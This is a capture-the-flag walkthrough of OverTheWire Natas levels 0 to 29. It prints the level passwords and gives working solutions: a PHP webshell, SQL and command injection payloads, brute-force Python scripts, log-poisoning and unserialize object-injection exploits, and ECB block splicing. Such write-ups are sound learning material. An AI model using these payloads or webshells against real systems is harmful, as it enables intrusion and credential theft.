# 0

Given:

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

Looking at the full page source we can find the password at line 16.

```html
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```

# 1

```
Username: natas1
URL:      http://natas1.natas.labs.overthewire.org
```

Same as before, but just shift+right click on firefox.

```html
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
```

# 2

```
Username: natas2
URL:      http://natas2.natas.labs.overthewire.org
```

There is nothing in this page except for `<img src="files/pixel.png">`. The image is not interesting, but going to the files directory shows a list of files, one being `users.txt`, which includes the password.

```
# username:password
...
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```

# 3

```
Username: natas3
URL:      http://natas3.natas.labs.overthewire.org
```

The source code mentions `Not even Google will find it this time...` which means that the website is hiding certain directories from appearing in search engines. Checking robots.txt we can find this:

> User-agent: *
> Disallow: /s3cr3t/

Checking s3cr3t directory you can use the same method as natas2 as it includes users.txt.

```
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

# 4

```
Username: natas4
URL:      http://natas4.natas.labs.overthewire.org
```

We get denied access when visiting the website, saying that `authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`. However we don't have access to natas5 yet, so we have to change the referer header when visiting the website.

Normally you can use burpsuite, but i found a firefox addon called [Referer Modifier](https://addons.mozilla.org/en-US/firefox/addon/referer-modifier/) by Airtower that would let me set the referer as `http://natas5.natas.labs.overthewire.org/` on any website. When doing so we can finally see the password.

```
Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK  
```

# 5

```
Username: natas5
URL:      http://natas5.natas.labs.overthewire.org
```

It says we aren't logged in. There's no other way to log in. I checked for any stored data using a cookie editor addon such as [Cookie Quick Manager](https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/), and I found out that there is one boolean cookie named `loggedin` which is set to 0. I set it to 1 which means that I am now considered logged in after refreshing the page.

```
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

# 6

```
Username: natas6
URL:      http://natas6.natas.labs.overthewire.org
```

It asks us for a secret key. It also gives us the PHP source code of the checker, which mentions ``include "includes/secret.inc";``. Visiting that file gives us the secret key. (Make sure to view source)

> $secret = "FOEIUWGHFEEUHOFUOIU";

Input that and we get the password.

```
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS 
```

# 7

```
Username: natas7
URL:      http://natas7.natas.labs.overthewire.org
```

The hint in the source code says `password for webuser natas8 is in /etc/natas_webpass/natas8` but going to that directory doesn't work. But clicking on the website buttons take you to `index.php?page=home` and `index.php?page=about` respectiely. So going to `index.php?page=/etc/natas_webpass/natas8` gives us the password.

```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

# 8

```
Username: natas8
URL:      http://natas8.natas.labs.overthewire.org
```

The PHP source code provides the secret key, but it is encoded with a function that is also given.

> ```php
> $encodedSecret = "3d3d516343746d4d6d6c315669563362";
> 
> function encodeSecret($secret) {
>     return bin2hex(strrev(base64_encode($secret)));
> }
> ```

The function first encodes the secret key into base64, then reverses it, and finally converts it to hexadecimal. To get the secret key we should do this backwards.

1. Convert `3d3d516343746d4d6d6c315669563362` hex into ascii: `==QcCtmMml1ViV3b`

2. Reverse the string: `b3ViV1lmMmtCcQ==`

3. Decode the base64: `oubWYf2kBq`

Enter the key and you will get the password

```
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t 
```

# 9

```
Username: natas9
URL:      http://natas9.natas.labs.overthewire.org
```

The program provides source code:

> ```php
> if($key != "") {
>     passthru("grep -i $key dictionary.txt");
> }
> ```

Basically all it does is return all the lines in dictionary.txt that partly contain the input. We can use this to print out the password for the next level, by printing the file `/etc/natas_webpass/natas10` instead, and commenting the rest of the string out using `#`. Also, entering `.` prints out the entire file. So i entered in `. /etc/natas_webpass/natas10 #` to get the password.

```
Output:

t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

# 10

```
Username: natas10
URL:      http://natas10.natas.labs.overthewire.org
```

I guess the filter is broken, because our previous solution still works: `. /etc/natas_webpass/natas11 #`

```
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

# 11

```
Username: natas11
URL:      http://natas11.natas.labs.overthewire.org
```

The website stores a `data` cookie with the value `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`.

Looking at the source code, it seems that the cookie is actually an array that stores the background color `bgcolor` as well as `showpassword`, but interpreted in JSON text format. The text is run through the xor_encrypt function, which xor's every letter by a secret key text. The result is then coverted into base64 and stored as the cookie. 

Since our cookie is based on the default array which is given: 

> $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

we need to pass a cookie that has `showpassword` as `yes` so we can get the password.

The first thing we need to do however is get the key, we can do this by xoring the cookie by the default array in JSON. (We're going to use PHP for this one)

> ```php
> <?php
> $text = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff")); 
> $key = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D");
> $outText = '';
> for ($i=0;$i<strlen($text);$i++) {
>   $outText .= $text[$i] ^ $key[$i % strlen($key)];
> }
> print $outText;
> print "\n";
> ?>
> ```

The key repeats, so the result is actually `eDWo`. With this we can place the key accordingly to get a cookie with the value.

> ```php
> <?php
> $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")); 
> $key = "eDWo";
> $outText = '';
> for ($i=0;$i<strlen($text);$i++) {
>   $outText .= $text[$i] ^ $key[$i % strlen($key)];
> }
> print base64_encode($outText);
> print "\n";
> ?>
> ```

We get our new cookie! `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`

Put this in your cookie editor and refresh the page.

```
The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

# 12

```
Username: natas12
URL:      http://natas12.natas.labs.overthewire.org
```

We get to input JPEG files. When I input a file, it seems that the only thing it checks for is if the file exceeds 1kb in size, otherwise it uploads and becomes accessible through the website. 

What we should upload instead is a PHP file that lets us execute shell commands through the website. A PHP webshell I found was ``<?php echo passthru($_GET['cmd']); ?>``, just put that on a file.

However, it renames the file with a random string and puts .jpg in the end. Looking through the source code it seems that the new filename is generated when we visit the site, and is stored on the html at line 17.

> `<input type="hidden" name="filename" value="w01h6ubw9x.jpg" />`

So all we have to do is inspect element and change the .jpg to .php.

Once we upload the file, we can run the file by clicking the link. We can then add `?cmd=cat /etc/natas_webpass/natas13` after the file name to see the password.

```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

# 13

```
Username: natas13
URL:      http://natas13.natas.labs.overthewire.org
```

The code now uses exif to check what file type it is. Basically checking the first few bytes and seeing whether it matches for a jpeg file.  The signature is `FF D8 FF E0`, we need a way to put that on our PHP file from last level. I used this python code to do this.

> ```python
> hex_jpeg = bytearray([0xFF, 0xD8, 0xFF, 0xE0])
> code = "<?php echo passthru($_GET['cmd']); ?>"
> with open('newCode.php', 'wb') as file:
>     file.write(hex_jpeg)
>     file.write(code.encode('utf-8'))
> ```

Once that's done, just follow the same steps as the previous level. Make sure you don't pick up the first four characters. (They may appear as a diamond with a question mark)

```
���� z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ 
```

# 14

```
Username: natas14
URL:      http://natas14.natas.labs.overthewire.org
```

The website is using SQL to get a username and password onto the website. Looking onto the source code it seems that the query is displayed like this:

> `SELECT * from users where username="(user)"and password="(pass)";`

Since we can put anything on the input, you can just leave the username blank, and put `"  or "1" = "1` as our password. Basically by doing this, we get all the users on the site which is more than 0 rows needed to get the success message.

```
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

# 15

```
Username: natas15
URL:      http://natas15.natas.labs.overthewire.org
```

The website uses SQL to check if a user exists. Just like the previous level, the input is unfiltered, but it looks like we need to brute force the password ourselves. We can use `natas16` as the user because it exists.

Instead of using the text box we can use the URL instead. After the index.php, we can try doing  `SELECT * from users where username="natas16" and password LIKE BINARY "(pass)%"`. The LIKE BINARY will help us compare the password input case-sensitively, and the % key will fill out the rest of the password, so we can brute force every character until we get the full password.  We can tell if it works because it will say "This user exists", while incorrect passwords are "This user doesn't exist". 

For the sake of time I just looked for other solutions for this level and took [this person's code.](https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas15.md) Brute forcing itself is time consuming anyway. Here's the python code.

> ```python
> import requests
> target = 'http://natas15.natas.labs.overthewire.org'
> charset_0 = (
>     '0123456789' +
>     'abcdefghijklmnopqrstuvwxyz' +
>     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
> )
> webauth = ('natas15','SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
> charset_1 = ''
> for c in charset_0:
>     username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
>     r = requests.get(target,
>         auth=webauth,
>         params={"username": username}
>     )
>     if "This user exists" in r.text:
>         charset_1 += c
>         print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
> 
> password = ""
> while len(password) != 32:
>     for c in charset_1:
>         t = password + c
>         username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
>         r = requests.get(target,
>             auth=webauth,
>             params={"username": username}
>         )
>         if "This user exists" in r.text:
>             print ('PASS: ' + t.ljust(32, '*'))
>             password = t
>             break
> ```

Once that's done we get the password.

```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

# 16

```
Username: natas16
URL:      http://natas16.natas.labs.overthewire.org
```

So this one is like natas10 except it filters out even more characters, so now our solution finally doesn't work. But Bash also allows us to execute commands inside a command using `$(cmd)`, which is not blocked in the website. So if we did something like `$(echo hello) helium`, it will end up being`hello helium`and return no result.

Looks like we need to bruteforce again... so the command we will use is `(grep -E ^(pass).* /etc/natas_webpass/natas17)helium`. This lets us run a regex expression that runs successfully if the starting characters, `(pass)`, match the start of the password. If it does, it will return a blank message, but wrong characters will just return the words with helium.

I used the same python code from the previous level, but with some changes.

> ```python
> import requests
> target = 'http://natas16.natas.labs.overthewire.org'
> charset_0 = (
>     '0123456789' +
>     'abcdefghijklmnopqrstuvwxyz' +
>     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
> )
> webauth = ('natas16','hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
> charset_1 = ''
> 
> for c in charset_0:
>     username = ('$(grep ' + c +' /etc/natas_webpass/natas17)helium')
>     r = requests.get(target,
>         auth=webauth,
>         params={"needle": username}
>     )
>     if "helium" not in r.text:
>         charset_1+=c
>         print ('CSET: ' + charset_1.ljust(32, '*'))
> 
> password = ""
> while len(password) != 32:
>     for c in charset_1:
>         t = password + c
>         username = ('$(grep -E ^' + t +'.* /etc/natas_webpass/natas17)helium')
>         r = requests.get(target,
>             auth=webauth,
>             params={"needle": username}
>         )
>         if "helium" not in r.text:
>             print ('PASS: ' + t.ljust(32, '*'))
>             password = t
>             break
> ```

This is the password we get:

```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

# 17

```
Username: natas17
URL:      http://natas17.natas.labs.overthewire.org
```

This is just natas15 but now it doesn't confirm if we got it right with the text. Both correct and incorrect usernames don't have anything to display. So we have to rely purely on SQL to brute force. One way we can do this is with the `sleep(secs)` command, so that if a string exists in the password then it will sleep for a number of seconds (We'll use two, but you can increase or decrease it if you want). The input will look like this: `natas16" AND password LIKE BINARY "(pass)&" AND sleep(2) #` You'll be waiting alot longer though. Here's the updated code.

We got this password:

```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

# 18

```
Username: natas18
URL:      http://natas18.natas.labs.overthewire.org
```

It looks like a login page where we need to be admin to get the password. Looking at the source code it seems it uses a cookie called `PHPSESSID`, which goes from 0 to 640, and tells what user it is logged onto. So we can just go through the entire range and see which session ID is admin.  We don't need to input anything else! 

```python
import requests
target = 'http://natas18.natas.labs.overthewire.org'
webauth = ('natas18','6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

for uid in range(640):
    r = requests.get(target,
        auth=webauth,
        cookies={"PHPSESSID": str(uid)}
    )
    print("ID: " + str(uid))
    if "You are an admin. The credentials for the next level are:" in r.text:
        print(r.text.split("Password:")[1].split('<')[0].strip())
        break
```

The password we get in session id 119 is

```
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

# 19

```
Username: natas19
URL:      http://natas19.natas.labs.overthewire.org
```

According to the website it is similar to the previous levels except the session ID is not sequential. I logged in as "admin" with a random password, saw the cookie and realized it was in hexadecimal, `3538302d61646d696e`, which translates to `580-admin`. So we just do the same thing as last time except add the extra text and convert to hex.

```python
import requests
target = 'http://natas19.natas.labs.overthewire.org'
webauth = ('natas19','tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

for uid in range(640):
    newid = (str(uid) + "-admin").encode("utf-8").hex()
    r = requests.get(target,
        auth=webauth,
        cookies={"PHPSESSID": newid}
    )
    print("ID: " + newid)
    if "You are an admin. The credentials for the next level are:" in r.text:
        print(r.text.split("Password:")[1].split('<')[0].strip())
        break
```

We get this at ID: 281

```
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```

# 20

```
Username: natas20
URL:      http://natas20.natas.labs.overthewire.org
```

For this one it seems the cookie is completely random, but the source code changes how it is read and written. I was stumped in this level, but after looking around, I found out that it uses a file to store two values: `name` and `admin`, and they are stored in plaintext and are separated with a newline character. We can only set `name` however, and we need to do this through the URL only. I did `http://natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin+1`, then refreshed the page. Sometimes this didn't work and I had to delete the cookie beforehand.

```
You are an admin. The credentials for the next level are:

Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```

# 21

```
Username: natas21
URL:      http://natas21.natas.labs.overthewire.org
```

The main website doesn't do anything other than display the password if `admin` equals 1. The CSS experimenter website, however, lets us change the value of `admin` freely. It seems we also need to set `submit` to `Update` for it to work aswell. I entered `http://natas21-experimenter.natas.labs.overthewire.org/index.php?submit=Update&admin=1` and it sets the cookie automatically. Since both websites are basically the same, all we need to do is copy the cookie of the experimenter website and set it as the one for the main site aswell.

```
You are an admin. The credentials for the next level are:

Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```

# 22

```
Username: natas22
URL:      http://natas22.natas.labs.overthewire.org
```

This one was pretty simple.  All you need to do is pass `?revelio` into the URL. However it auto-redirects and doesn't show the password, so I used the curl command: `curl -i -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz http://natas22.natas.labs.overthewire.org/\?revelio`

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
```

# 23

```
Username: natas23
URL:      http://natas23.natas.labs.overthewire.org
```

This is also pretty simple, it just checks if the given password has `iloveyou` anywhere on the string, and is atleast 10 characters. I just used `1111iloveyou`.

```
The credentials for the next level are:

Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```

# 24

```
Username: natas24
URL:      http://natas24.natas.labs.overthewire.org
```

This website uses `strcmp()` to see if a password is the same as the actual password string, however it is censored. Apparantly this function is kinda broken in PHP because it returns true if you pass in a non-string as a password. So i passed in an empty array by doing `?passwd[]`.

```
The credentials for the next level are:

Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```

# 25

```
Username: natas25
URL:      http://natas25.natas.labs.overthewire.org
```

The website shows a quote, and a selection of two langauges that switches the text. Looking at the source code, the `lang` variable that contains the language is returning the file which contains the quotes. It's on a fixed directory which we don't know the location, so we have to directory traverse to find the password.

However, there's also this function called `safeinclude($filename)`, which does two things:

1. removes all instances of `../`. Luckily it does this only once so we can bypass this by doing `....//`.

2. stops from running any further if it contains `natas_webpass`, so we can't access the file directly.

That was when I found another function:

> ```php
>     function logRequest($message){
>         $log="[". date("d.m.Y H::i:s",time()) ."]";
>         $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
>         $log=$log . " \"" . $message ."\"\n"; 
>         $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
>         fwrite($fd,$log);
>         fclose($fd);
>     }
> ```

This creates a file based on my session id, which is stored in our PHPSESSID cookie (MIne is `vanjddmfn2t60ii6m4faoov3bq`). We can access it by doing `?lang=....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_vanjddmfn2t60ii6m4faoov3bq.log` 

Another thing about this log is that it parses our user agent for some reason. We can put PHP code on our user agent and it will run. So using an user agent editor such as [this](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/) will help us change our user agent to `<?php system('cat /etc/natas_webpass/natas26'); ?>`.  

After changing our user agent and accessing the log file, we get our password in the HTML source.

```
[29.12.2023 04::25:03] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
```

# 26

```
Username: natas26
URL:      http://natas26.natas.labs.overthewire.org
```

According to the source code, the coordinates are stored in the `drawing` cookie. If it exists, then it gets interpreted with this line:

```php
$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

Apparantly the `unserialize()` function is very vulnurable, as it allows us to run arbritary objects. Luckily the source code includes a class we can use called `Logger`.

> ```php
> class Logger{
>     private $logFile;
>     private $initMsg;
>     private $exitMsg;
> 
>     function __construct($file){
>         // initialise variables
>         $this->initMsg="#--session started--#\n";
>         $this->exitMsg="#--session end--#\n";
>         $this->logFile = "/tmp/natas26_" . $file . ".log";
>         ... 
> ```

What we can do is make an object with this `Logger` class, change the `exitMsg` to PHP code that will return the password (same as last problem), and change `logFIle` to an easily accessible path.

```php
<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>\n";
        $this->logFile = "/var/www/natas/natas26/img/natas27Pass.php";
    }
}
$log = new Logger();
print base64_encode(serialize($log));
?>
```

Running this code will return our new `drawing` cookie value: 

```
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyN1Bhc3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MjI6IiMtLXNlc3Npb24gc3RhcnRlZC0tIwoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MToiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjt9
```

With a cookie editor, replace the `drawing` cookie with this one, and refresh the page. You will know if it works because the website will spit out an error, preventing you from accessing the source code. Access the created log file by going to `/img/natas27Pass.php`, and you'll find the password.

```
u3RRffXjysjgwFU6b9xa23i6prmUsYne
```

# 27

```
Username: natas27
URL:      http://natas27.natas.labs.overthewire.org
```

The website presents a simple login page, with the provided source code.

If there's a user with the provided username, then it will login and show the user's login details, if the password is correct. If it doesn't exist, then it will create a new SQLi entry with those details. We need to try to log in to `natas28`.

The source code also provides the SQL table:

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

Since the size of the username and passwords are only 64 characters, we can try to post a username that is longer than 64 characters, which would let us pass through without checking if the password matches, creating more than one user called `natas28`.

I did this by passing my GET parameters in the url. The username is "natas28"" followed by around 60 null characters (`%00`) and some random characters ("test") to prevent it from being truncated, and the password is just "test":

```
/?username=natas28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00test&password=test
```

Passing this onto the website will show `User natas28test was created!`, but in reality the code has created an existing user under `natas28`, allowing us to log in with the password `test`. Doing so will show the password details for the first natas28 user.

```
Welcome natas28!
Here is your data:
Array ( [username] => natas28 [password] => 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj ) 
```

# 28

```
Username: natas28
URL:      http://natas28.natas.labs.overthewire.org
```

Strangely there is no source code provided for this one. It seems to use SQL to get the jokes, but any injection methods sent through the search bar will not work here.

I noticed when searching for something such as "test", it will go to `search.php` and send a `query` with the search (btw, here's a handy [URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/)): `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK/ZEJpSw8lYr3+NDY3VpFZKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=` 

Another search with "passwords": `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIQ+2QTbcCowp8YHJ+hQkThoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=`

Playing with the values a bit gave me error messages such as `Zero padding found instead of PKCS#7 padding`, so this means the query uses AES with ECB mode, with blocks sized 16 bytes each (The query is in base64, so you are better off converting to hex for easier conversion).

I noticed that all searches start with two blocks,`G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP` ,so we do not need to worry about those.

The first step I did is figure out how many characters it'll take to fill out the third block. So i wrote python code that searches for a query of spaces, going from 1 space to 16 spaces.

```python
import requests
from urllib.parse import unquote
target = 'http://natas28.natas.labs.overthewire.org/'
webauth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

letters = 1
while (letters <= 16):
    query = ' ' * letters
    r = requests.get(target, 
    auth=webauth,
    params={"query": query}
    )
    print(str(letters) + '\t' + unquote(r.url).split("G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP")[-1])
    letters += 1
```

I noticed that after 10 spaces, the block will stay the same, as `ItlMM3qTizkRB5P2zYxJsb`. That means we can use the first 9 spaces to check if a character is being filtered with a backslash `\`.  I did this by using the backslash as my 10th character first, then comparing it to special characters that I may use for my SQL injection attack, including quotes, hashes, or semicolons. I replaced the bottom of my python code with this:

```python
letters = ['\\','\'',';','#']
for letter in letters:
    query = (' ' * 9) + letter
    r = requests.get(target, 
    auth=webauth,
    params={"query": query}
    )
    print(letter + '\t' + unquote(r.url).split("G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP")[-1])
```

After running it I noticed that the escape backslash and the single quote character `'` match, with the third block being `I5F6VCqpwV1FClOSe+OGDl`. This means that the website is replacing every `'`  with `\'`. Luckily, it's our only character being escaped, and it only has to be on the front, so we can just replace it with our 10-space block `ItlMM3qTizkRB5P2zYxJsb`.

To do this, I planned on using this SQL injection attack: `' UNION SELECT ALL password FROM users;#`. The table is based on last level's SQL table. I also need to put the 9 spaces on the front, so the query we need to search for is `         ' UNION SELECT ALL password FROM users;#`.

The query we get is `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI5F6VCqpwV1FClOSe+OGDl+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cnA2yS1J0uiEtGwbpkMjbKfSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=` All we need to do is to replace the blocks as mentioned before. Our new query is `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cnA2yS1J0uiEtGwbpkMjbKfSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=`. 

After URL encoding the final website should be `http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cnA2yS1J0uiEtGwbpkMjbKfSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D` Visit it and we will get the password for natas29.

```
Whack Computer Joke Database
    31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
```

I'd have no idea how to do this level if not for [this video](https://www.youtube.com/watch?v=oWmfYgCYmCc)

# 29

```
Username: natas29
URL:      http://natas29.natas.labs.overthewire.org
```

This website has a dropdown with a bunch of files called `perl underground X`, X being from 1 to 5. Apparantly it includes stuff about Perl in general, also some rants and evangelism on perl (for some reason i cannot find anything about Perl Underground on google except for the same text files, shame).  This was completely unrelated to the challenge though, so I decided to just look at ways to do bash command injection using perl.

Since the `file` variable includes the file name, you can pass commands through that. Apparantly one way you can do this is by posting the value as `|(cmd)%00`, so you can do `index.pl?file=|ls%00` to get the files in the directory, for example. 

However, trying to access `/etc/natas_webpass/natas29` just returns `meeeeeep!`. According to the source code of index.pl (which you can access by doing `index.pl?file=|cat index.pl%00`) it shows that posting anything that includes `natas` will fail.

```perl
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

Though there's an easy way to bypass this by using Bash wildcards. So replacing every `natas` with just an asterisk would do the trick. I put `?file=|cat /etc/*_webpass/*30%00` and got the password.

```
WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
```

# 30

```
Username: natas30
URL:      http://natas30.natas.labs.overthewire.org
```
